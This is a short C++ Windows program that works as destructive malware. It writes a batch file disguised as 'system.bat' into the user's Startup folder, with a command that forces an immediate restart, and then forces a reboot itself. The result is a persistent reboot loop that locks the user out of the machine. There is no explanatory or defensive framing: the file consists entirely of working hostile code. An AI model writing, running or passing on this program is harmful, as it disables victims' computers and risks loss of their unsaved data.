#include <iostream>
#include <fstream>
#include <cstdlib>
#include <windows.h>
#include <shlobj.h>

using namespace std;

int main(){

    char userHome[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_APPDATA,NULL,0,userHome)!= S_OK){
        cerr << "Failed to retrieve user directory." << endl;
    }

    string startUpFilePath = string(userHome) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system.bat";

    ofstream file(startUpFilePath);

    if (file.is_open()){
        file << "shutdown /r /f /t 0";
        file.close();
        cout << "The system.bat file was created successfully:" << startUpFilePath << endl;      
    }
    else{
        cerr << "The system.bat file was created failed!" << endl;
    }
    
     system("shutdown /r /f /t 0");

     return 0;
}